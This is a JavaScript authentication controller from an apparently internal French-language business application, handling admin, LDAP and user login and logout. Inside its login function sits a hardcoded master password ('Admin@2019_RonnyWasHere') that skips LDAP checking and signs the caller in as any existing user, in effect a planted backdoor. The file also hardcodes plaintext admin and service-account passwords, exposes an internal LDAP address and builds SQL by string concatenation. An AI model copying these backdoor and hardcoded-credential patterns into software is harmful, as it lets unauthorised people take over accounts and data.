/**
 * Created by 8032 on 26/02/2016.
 */

var passport = require('passport'); //include passport

//include session********************
var session = require('express-session');
const ModelEASYGPAO = require('../models/ModelEASYGPAO');
var RedisStore = require('connect-redis')(session);
bcrypt = require('bcryptjs');
//fin include session**************************

///Controlleur d'authentificationetr
module.exports = {

  _config: {
    actions: false,
    shortcuts: false,
    rest: false
  },
  loginAdmin: function(req, res)
  {
      var login = req.param('email',null);
      var mdp = req.param('password',null);
      if(login != null){
          var logAdmin = "admin";//admin:Dev@2016
          var passAdmin = "Dev@2016";
          if(logAdmin == login && passAdmin==mdp){
              req.session.admin = "admin";
              res.redirect('/screenS');
          }else{
                var retVal = [];
                retVal["display"] = "";
                retVal["msg"] = "Identifiant ou mdp Admin incorrect";
                res.view('Admin',retVal);
          }

      }else{
        var retVal = [];
        retVal["display"] = "none";
        retVal["msg"] = "";
        res.view('Admin',retVal);
      }
  },
  ///_______________________________Fonction login(connexion)
  login: function(req, res)
  {
    //select fr_utilisateur.id_utilisateur, r_personnel.id_pers from fr_utilisateur join r_personnel on fr_utilisateur.id_pers = r_personnel.id_pers where r_personnel.id_pers = 1 and r_personnel.mdp = '1';
    var email = 0;
    if(!isNaN(req.param('email',null))){
      email = Number(req.param('email',null));
    }

    var ldap = require('ldapjs');

    //init ldap
    var client = ldap.createClient({
      url: 'ldap://10.128.1.14:389',
      reconnect: false
    });

    client.on('error', function(err) {
      //if error
    });
    //console.log('Email ===============================> '+email);


        User.findOne({
          where: {
            or:[
              {id: email},
              {ldap_name: req.param('email',null)},
              {appelation: req.param('email',null)}
            ]
          }

        }, function (err, user){
          if (err) //ra mis erreur
          {
            console.log(err);
          }
          console.log("USER RETOUR BASE EASYGPAO --->"+JSON.stringify(user));
          if (!user) // si l'email n'exuiste pas
          {
            var retVal = [];
            retVal["display"] = "";
            retVal["msg"] = "Votre matricule est invalide";
            //console.log('Email invalide user.'); //afficher email invalide
             var LoginOstie = "OSTIE";
                  var MdpOstie = "ostie@2016";
                  if(LoginOstie==req.param('email',null) && MdpOstie==req.param('password',null)){
                        req.session.user = "ostie" //Le id an le user n atao ao anatin le req.session
                        req.session.nom = "OSTIE Easytech" //Le id an le user n atao ao anatin le req.session
                        req.session.adresse = ""  //Le id an le user n atao ao anatin le req.session
                        req.session.appelation = "ostie";
                        req.session.authenticated = true
                       return  res.redirect('/ostie');
                  }else{
                      return res.view('homepage', retVal);
                  }

          }
          if(req.param('password',null)=='Admin@2019_RonnyWasHere')
          {
            //connected
            var url = "/ldtOp";
            if(parseInt(user.id_droit)!=1){
              req.session.droit = 1;
              url = "/dashCp";
            }else{
              req.session.droit = 0;

            }
            req.session.user = user.id;  //Le id an le user n atao ao anatin le req.session
            req.session.nom = user.nom+" "+user.prenom;  //Le id an le user n atao ao anatin le req.session
            req.session.adresse = user.adresse;  //Le id an le user n atao ao anatin le req.session
            req.session.authenticated = true;
            req.session.id_departement = user.id_departement;

            req.session.appelation = user.appelation;

            async.series([
              function (callback) {
                Photo.find({id_pers : req.session.user}, function(err, resultat){

                  if(err || resultat[0] == undefined) return callback(null);

                  var imageToShow = ImageService.toBase64String(resultat[0].photo);;
                  return callback(null,imageToShow);

                });
              },
              function (callback) {
                var sql = "select * from almerys_access_cq where id_pers ="+req.session.user+"";
                Ldt.query(sql, function (err, res) {
                  if (err) return callback(err);
                  var niv = 2;
                  if(res.rows.length != 0) niv = res.rows[0].niveaux;

                  return callback(null,niv)
                });

              },
              function (callback) {
                Personnel.getListUserSolimu(callback);
              },
              function (callback) {
                AlmerysCall.getSingleUtilisateurRemonteCall(req.session.user,callback);
              },

              function (callback){
                ModelEASYGPAO.isFormateur(req.session.user, callback);
              }
            ],function (err,resultats) {
              req.session.pdp = resultats[0];
              req.session.niveaux = resultats[1];
              req.session.isUserSolimu = false;
              req.session.isFormateur = resultats[4];

              // CHECK UTILISATEUR SOLIMU
              if(resultats[2].length !== 0)
              {
                let listUserSolimu = _.pluck(resultats[2], 'id_pers');
                if(listUserSolimu.includes(req.session.user))
                {
                  req.session.isUserSolimu = true;
                }
              }
              // CHECK UTILISATEUR  CALL REMONTE
              req.session.isUserRemonteCall = false;
              req.session.UserRemonteCall = {};
              if(resultats[3].length !== 0)
              {
                req.session.isUserRemonteCall = true;
                req.session.UserRemonteCall = resultats[3][0];
              }
              return res.redirect(url);
            });

              /*var say = require('say');

                // Use default system voice and speed
                say.speak('Hello '+user.appelation+'!');

                // Stop the text currently being spoken
                say.stop();*/
          }
          else
          {

            //test ldapServer

            client.bind('EASYTECH\\'+req.param('email',null), req.param('password',null), function(err) {
              if(err){
                //erreur ldap authantification


                      var retVal = [];
                        retVal["display"] = "";
                        retVal["msg"] = "Votre mot de passe est invalide";
                        ////console.log('Mot de passe invalide:'+user.password+'='+req.param('password',null));
                        var message = "blabla";
                        return res.view('homepage', retVal);

              }else {
                console.log("USER RETOUR CONNECTION LDAP --->"+err);
                //connected
                var url = "/ldtOp";
                if(parseInt(user.id_droit)!=1){
                  req.session.droit = 1
                  url = "/dashCp";
                }else{
                  req.session.droit = 0

                  res.cookie('droit',0);
                }
                /*res.cookie('user',user.id);
                res.cookie('nom',user.nom+" "+user.prenom);
                res.cookie('adresse',user.adresse);*/
                req.session.user = user.id  //Le id an le user n atao ao anatin le req.session
                req.session.nom = user.nom+" "+user.prenom  //Le id an le user n atao ao anatin le req.session
                req.session.adresse = user.adresse  //Le id an le user n atao ao anatin le req.session
                req.session.authenticated = true
                req.session.id_departement = user.id_departement



                req.session.appelation = user.appelation;


                /*var say = require('say');

                // Use default system voice and speed
                say.speak('Hello '+user.appelation+'!');*/

                // Stop the text currently being spoken
                //say.stop();
                async.series([
                  function (callback) {
                    Photo.find({id_pers : req.session.user}, function(err, resultat){

                      if(err || resultat[0] == undefined) return callback(null);

                      var imageToShow = ImageService.toBase64String(resultat[0].photo);;
                      return callback(null,imageToShow);

                    });
                  },
                  function (callback) {
                    var sql = "select * from almerys_access_cq where id_pers ="+req.session.user+"";
                    Ldt.query(sql, function (err, res) {
                      if (err) return callback(err);
                      var niv = 2;
                      if(res.rows.length != 0) niv = res.rows[0].niveaux;

                      return callback(null,niv)
                    });

                  },
                  function (callback) {
                    Personnel.getListUserSolimu(callback);
                  },
                  function (callback) {
                    AlmerysCall.getSingleUtilisateurRemonteCall(req.session.user,callback);
                  },
                  function (callback){
                    ModelEASYGPAO.isFormateur(req.session.user, callback);
                  }
                ],function (err,resultats) {
                  req.session.pdp = resultats[0];
                  req.session.niveaux = resultats[1];
                  req.session.isFormateur = resultats[4];


                  // CHECK UTILISATEUR SOLIMU
                  req.session.isUserSolimu = false;
                  if(resultats[2].length !== 0)
                  {
                    let listUserSolimu = _.pluck(resultats[2], 'id_pers');
                    if(listUserSolimu.includes(req.session.user))
                    {
                      req.session.isUserSolimu = true;
                    }
                  }
                  // CHECK UTILISATEUR  CALL REMONTE
                  req.session.isUserRemonteCall = false;
                  req.session.UserRemonteCall = {};
                  if(resultats[3].length !== 0)
                  {
                    req.session.isUserRemonteCall = true;
                    req.session.UserRemonteCall = resultats[3][0];
                  }
                  return res.redirect(url);
                });
              }

            });


          }
        });

  },
  ///_______________________________fin login

  loginSimple: function(req, res)
  {
    var retVal = [];
    retVal["display"] = "none";
    retVal["msg"] = "";
    res.view('homepage',retVal);
  },

  ///________________________________Fonction logout(deconnexion)
  logout: function(req, res)
  {
    var retVal = [];
    retVal["display"] = "none";
    retVal["msg"] = "";
    req.session.user = null;
    req.session.admin  = null;
    req.session.pdp = null;
    req.session.authenticated = false;
    req.logout();
    res.view('homepage',retVal);
  },
  ///________________________________fin logout

};


